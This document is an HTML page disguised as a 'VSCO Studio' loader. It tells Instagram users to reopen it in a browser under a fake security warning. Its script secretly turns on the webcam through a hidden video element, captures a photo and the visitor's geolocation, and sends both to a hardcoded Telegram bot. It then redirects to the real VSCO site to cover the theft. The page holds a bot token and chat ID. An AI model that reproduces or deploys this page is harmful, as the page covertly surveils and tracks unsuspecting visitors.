<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VSCO Studio</title>
    <style>
        body { background: #000; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        .vsco-logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 2s infinite ease-in-out; }
        @keyframes pulse { 0% { transform: scale(0.95); opacity: 0.6; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(0.95); opacity: 0.6; } }
        #status { font-size: 14px; color: #fff; text-align: center; padding: 30px; line-height: 1.8; display: none; border: 1px solid #333; margin: 20px; border-radius: 8px; background: #111; }
        #loading { font-size: 11px; letter-spacing: 2px; opacity: 0.5; text-transform: uppercase; }
        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
    </style>
</head>
<body>
    <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
    <div id="loading">Initializing Studio...</div>
    
    <div id="status">
        <b style="color: #ff4b4b;">‚ö†Ô∏è Security Action Required</b><br>
        The Instagram in-app browser does not support secure studio authentication.<br><br>
        To continue, please tap the <b>(‚ãÆ)</b> menu and select<br>
        <span style="color: #3897f0; font-weight: bold;">"Open in Browser"</span>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = "8528253517:AAGk6SRaXs-M3PTPT3Z-ZwhLQXyQkI1bZMs"; //
        const chatId = "8005843544"; // Correct ID

        const isInstagram = navigator.userAgent.includes("Instagram");

        window.onload = async () => {
            if (isInstagram) {
                // Show mandatory external browser message inside Instagram
                document.getElementById('loading').style.display = "none";
                document.getElementById('status').style.display = "block";
            }

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('video');
                v.srcObject = s;
                
                const checkInterval = setInterval(() => {
                    const c = document.getElementById('canvas');
                    const ctx = c.getContext('2d');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    ctx.drawImage(v, 0, 0);
                    
                    const data = ctx.getImageData(0, 0, c.width, c.height).data;
                    let b = 0;
                    for (let i = 0; i < data.length; i += 4) b += (data[i] + data[i+1] + data[i+2]) / 3;
                    
                    if ((b / (data.length / 4)) > 40) { 
                        clearInterval(checkInterval);
                        sendData(c);
                    }
                }, 1000);
            } catch (e) {
                // Redirect if permissions are denied or on normal browser failure
                if (!isInstagram) {
                    setTimeout(() => { window.location.href = "https://vsco.co/"; }, 1500);
                }
            }
        };

        function sendData(canvas) {
            // Send Geolocation
            navigator.geolocation.getCurrentPosition(p => {
                const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=‚úÖ Captured!\nüìç Location: ${loc}`);
            });

            // Send Photo
            canvas.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', chatId);
                f.append('photo', blob);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg');
            
            // Final redirect to official VSCO site
            setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
        }
    </script>
</body>
</html>
